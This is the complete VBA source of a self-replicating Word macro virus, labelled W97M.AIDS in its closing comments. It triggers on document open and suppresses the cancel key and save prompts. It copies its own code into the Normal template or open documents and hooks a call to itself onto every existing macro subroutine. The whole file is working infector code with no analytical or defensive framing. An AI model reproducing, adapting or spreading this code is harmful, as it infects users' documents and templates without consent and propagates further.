   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Function AIDS()
   Application.EnableCancelKey = wdCancelDisabled
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False
   Set TD = ThisDocument.VBProject.VBComponents
   For FindCode = 1 To TD.Count
   If TD.Item(FindCode).CodeModule.CountOfLines > 0 Then
   For CodeLines = 1 To TD.Item(FindCode).CodeModule.CountOfLines
   If TD.Item(FindCode).CodeModule.Lines(CodeLines, 1) = "Private Function AIDS()" Then
   MyCode = TD.Item(FindCode).CodeModule.Lines(CodeLines, 32)
   End If
   Next
   End If
   Next
   If ThisDocument = ActiveDocument Then Set Target = NormalTemplate Else Set Target = ActiveDocument
   Set TargetComp = Target.VBProject.VBComponents
   For TargetModule = 1 To TargetComp.Count
   If TargetComp.Item(TargetModule).CodeModule.CountOfLines > 0 Then
   For CodeLines = 1 To TargetComp.Item(TargetModule).CodeModule.CountOfLines
   If TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) = "Private Function AIDS()" Then End
   Next
   For CodeLines = 1 To TargetComp.Item(TargetModule).CodeModule.CountOfLines
   If Left(TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1), 12) = "Private Sub " Then
   TargetComp.Item(TargetModule).CodeModule.ReplaceLine CodeLines, TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) & ": AIDS"
   ElseIf Left(TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1), 4) = "Sub " Then
   TargetComp.Item(TargetModule).CodeModule.ReplaceLine CodeLines, TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) & ": AIDS"
   End If
   Next
   TargetComp.Item(TargetModule).CodeModule.AddFromString MyCode
   End If
   Next
   End Function
   Private Sub Document_Open(): AIDS
   End Sub
   'Do Not Distribute
   'Name = W97M.AIDS
   'Author = Lys Kovick
